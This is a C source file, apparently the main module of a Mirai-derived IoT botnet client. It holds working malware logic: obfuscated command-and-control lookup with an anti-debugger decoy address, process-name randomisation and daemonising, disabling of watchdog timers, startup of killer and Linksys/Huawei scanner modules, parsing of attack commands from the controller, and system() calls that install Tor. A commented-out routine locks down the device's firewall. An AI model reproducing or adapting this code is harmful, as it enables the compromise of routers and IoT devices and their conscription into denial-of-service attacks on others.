#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#include "util.h"
#include "killer.h"
#include "scanner.h"
#include "linksys8080_scanner.h"
#include "huawei.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, ioctl_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif
/* adding rules to firewall and all device are only mine
void firewall_enable(void)
{
	//char *f_delete[11], *f_sessions[70], *f_iport[48], *f_oport[49], *f_i80[45], *f_o80[46], *f_i23[45], *f_o23[46], *f_i443[46], *f_o443[47], *f_i53[45], *f_o53[46], *f_i2323[47], *f_o2323[48], *f_isecret[45], *f_osecret[46], *f_iblockall[25], *f_oblockall[26];
	char *f_delete, *f_sessions, *f_iport, *f_oport, *f_i80, *f_o80, *f_i23, *f_o23, *f_i443, *f_o443, *f_i53, *f_o53, *f_i2323, *f_o2323, *f_isecret, *f_osecret, *f_iblockall, *f_oblockall;
	int f_delete_len = 0, f_sessions_len = 0, f_iport_len = 0, f_oport_len = 0, f_i80_len = 0, f_o80_len = 0, f_i23_len = 0, f_o23_len = 0, f_i443_len = 0, f_o443_len = 0, f_i53_len = 0, f_o53_len = 0, f_i2323_len = 0, f_o2323_len = 0, f_isecret_len = 0, f_osecret_len = 0, f_iblockall_len = 0, f_oblockall_len = 0; 

	table_unlock_val(TABLE_FIREWALL_DELETE);
	table_unlock_val(TABLE_FIREWALL_SESSION);
	table_unlock_val(TABLE_FIREWALL_IPORT); 
	table_unlock_val(TABLE_FIREWALL_OPORT); 
	table_unlock_val(TABLE_FIREWALL_I80); 
	table_unlock_val(TABLE_FIREWALL_O80); 
	table_unlock_val(TABLE_FIREWALL_I23);
	table_unlock_val(TABLE_FIREWALL_O23); 
	table_unlock_val(TABLE_FIREWALL_I443);
	table_unlock_val(TABLE_FIREWALL_O443);
	table_unlock_val(TABLE_FIREWALL_I53);
	table_unlock_val(TABLE_FIREWALL_O53);
	table_unlock_val(TABLE_FIREWALL_I2323);
	table_unlock_val(TABLE_FIREWALL_O2323);
	table_unlock_val(TABLE_FIREWALL_ISECRET);
	table_unlock_val(TABLE_FIREWALL_OSECRET);
	table_unlock_val(TABLE_FIREWALL_IBLOCKALL);
	table_unlock_val(TABLE_FIREWALL_OBLOCKALL);
	
	f_delete = table_retrieve_val(TABLE_FIREWALL_DELETE, &f_delete_len);
	f_sessions = table_retrieve_val(TABLE_FIREWALL_SESSION, &f_sessions_len);
	f_iport = table_retrieve_val(TABLE_FIREWALL_IPORT, &f_iport_len);
	f_oport = table_retrieve_val(TABLE_FIREWALL_OPORT, &f_oport_len);
	f_i80 = table_retrieve_val(TABLE_FIREWALL_I80, &f_i80_len);
	f_o80 = table_retrieve_val(TABLE_FIREWALL_O80, &f_o80_len);
	f_i23 = table_retrieve_val(TABLE_FIREWALL_I23, &f_i23_len);
	f_o23 = table_retrieve_val(TABLE_FIREWALL_O23, &f_o23_len);
	f_i443 = table_retrieve_val(TABLE_FIREWALL_I443, &f_i443_len);
	f_o443 = table_retrieve_val(TABLE_FIREWALL_O443, &f_o443_len);
	f_i53 = table_retrieve_val(TABLE_FIREWALL_I53, &f_i53_len);
	f_o53 = table_retrieve_val(TABLE_FIREWALL_O53, &f_o53_len);
	f_i2323 = table_retrieve_val(TABLE_FIREWALL_I2323, &f_i2323_len);
	f_o2323 = table_retrieve_val(TABLE_FIREWALL_O2323, &f_o2323_len);
	f_isecret = table_retrieve_val(TABLE_FIREWALL_ISECRET, &f_isecret_len);
	f_osecret = table_retrieve_val(TABLE_FIREWALL_OSECRET, &f_osecret_len);
	f_iblockall = table_retrieve_val(TABLE_FIREWALL_IBLOCKALL, &f_iblockall_len);
	f_oblockall = table_retrieve_val(TABLE_FIREWALL_OBLOCKALL, &f_oblockall_len);
	
	system(f_delete);
	system(f_sessions);
    system(f_iport);
    system(f_oport);
    system(f_i80);
	system(f_o80);
	system(f_i23);
	system(f_o23);
	system(f_i443);
	system(f_o443);
	system(f_i53);
	system(f_o53);
	system(f_i2323);
	system(f_o2323);
	system(f_isecret);
	system(f_osecret);
	system(f_iblockall);
	system(f_oblockall);

#ifdef DEBUG
	printf("[main/fw Command Sent\n]");
#endif
	
	table_lock_val(TABLE_FIREWALL_DELETE);
	table_lock_val(TABLE_FIREWALL_SESSION);
	table_lock_val(TABLE_FIREWALL_IPORT); 
	table_lock_val(TABLE_FIREWALL_OPORT); 
	table_lock_val(TABLE_FIREWALL_I80); 
	table_lock_val(TABLE_FIREWALL_O80); 
	table_lock_val(TABLE_FIREWALL_I23);
	table_lock_val(TABLE_FIREWALL_O23); 
	table_lock_val(TABLE_FIREWALL_I443);
	table_lock_val(TABLE_FIREWALL_O443); 
	table_lock_val(TABLE_FIREWALL_I53);
	table_lock_val(TABLE_FIREWALL_O53);
	table_lock_val(TABLE_FIREWALL_I2323);
	table_lock_val(TABLE_FIREWALL_O2323);
	table_lock_val(TABLE_FIREWALL_ISECRET);
	table_lock_val(TABLE_FIREWALL_OSECRET);
	table_lock_val(TABLE_FIREWALL_IBLOCKALL);
	table_lock_val(TABLE_FIREWALL_OBLOCKALL);
}
*/

void torenable(void)
{
	system("apt install tor -y > /dev/null");
	system("service tor start");
}

void ioctl_keepalive(void)
{
    ioctl_pid = fork();
    if(ioctl_pid > 0 || ioctl_pid == -1)
        return;

    int timeout = 1;
    int ioctl_fd = 0;
    int found = FALSE;

    table_unlock_val(TABLE_WATCHDOG_1);
    table_unlock_val(TABLE_WATCHDOG_2);
    table_unlock_val(TABLE_WATCHDOG_3);
    table_unlock_val(TABLE_WATCHDOG_4);
    table_unlock_val(TABLE_WATCHDOG_5);
    table_unlock_val(TABLE_WATCHDOG_6);
    table_unlock_val(TABLE_WATCHDOG_7);
    table_unlock_val(TABLE_WATCHDOG_8);
    table_unlock_val(TABLE_WATCHDOG_9);

    if((ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_1, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_2, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_3, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_4, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_5, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_6, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_7, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_8, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_9, NULL), 2)) != -1)
    {
        #ifdef DEBUG
            printf("[ioctl] found a driver on the drvice\n");
        #endif
        found = TRUE;
        ioctl(ioctl_fd, 0x80045704, &timeout);
    }

    if(found)
    {
        while(TRUE)
        {
            #ifdef DEBUG
                printf("[ioctl] sending keep-alive ioctl call to the driver\n");
            #endif
            ioctl(ioctl_fd, 0x80045705, 0);
            sleep(10);
        }
    }

    table_lock_val(TABLE_WATCHDOG_1);
    table_lock_val(TABLE_WATCHDOG_2);
    table_lock_val(TABLE_WATCHDOG_3);
    table_lock_val(TABLE_WATCHDOG_4);
    table_lock_val(TABLE_WATCHDOG_5);
    table_lock_val(TABLE_WATCHDOG_6);
    table_lock_val(TABLE_WATCHDOG_7);
    table_lock_val(TABLE_WATCHDOG_8);
    table_lock_val(TABLE_WATCHDOG_9);

    #ifdef DEBUG
        printf("[ioctl] driver not found\n");
    #endif

    exit(0);
}

int main(int argc, char **args)
{
    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len = 0;
    int tbl_exec_succ_len = 0;
    int pgid, pings = 0;


#ifndef DEBUG
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, &anti_gdb_entry);
#endif

#ifdef DEBUG
    printf("DEBUG MODE YO\n");

    sleep(1);

    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror("sigaction");

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror("sigaction");
#endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

	table_init();

    anti_gdb_entry(0);

    ensure_single_instance();

    rand_init();
	
	ioctl_keepalive();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    util_zero(name_buf, 32);

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);
	
#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif
	attack_init();
	torenable();				/*firewall_enable();*/
    killer_init();
#ifndef DEBUG
#ifdef SCANNERINIT
    scanner_init();
	linksysscanner_scanner_init();
	huaweiscanner_scanner_init();
#endif
#endif
	
    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
#endif
#ifdef SCANNERINIT
            scanner_kill();
#endif
            killer_kill();
            kill(pgid * -1, 9);
            if(ioctl_pid != 0)
                kill(ioctl_pid, 9);
            exit(0);
        }

        if(pending_connection)
        {
            pending_connection = FALSE;

            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("[main] timed out while connecting to CNC\n");
                #endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    #ifdef DEBUG
                        printf("[main] error while connecting to CNC code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if(id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
                    #ifdef DEBUG
                        printf("[main] connected to CNC.\n");
                    #endif
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            if(len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL); // skip buffer forlength
                continue;
            }
            len = ntohs(len);
            if(len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            #ifdef DEBUG
                printf("[main] received %d bytes from CNC\n", len);
            #endif

            if(len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
	struct resolv_entries *entries;

    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("[main] failed to resolve cnc address\n");
#endif
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);
	table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);

#ifdef DEBUG
    printf("[main] resolved domain\n");
#endif

}
static void establish_connection(void)
{
if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
#ifdef DEBUG
    printf("[main] Tearing down connection to CNC!\n");
#endif

    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
#endif
        }
        
        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
#endif
        }
#ifdef DEBUG
        printf("[main] We are the only process on this system!\n");
#endif
    }
}

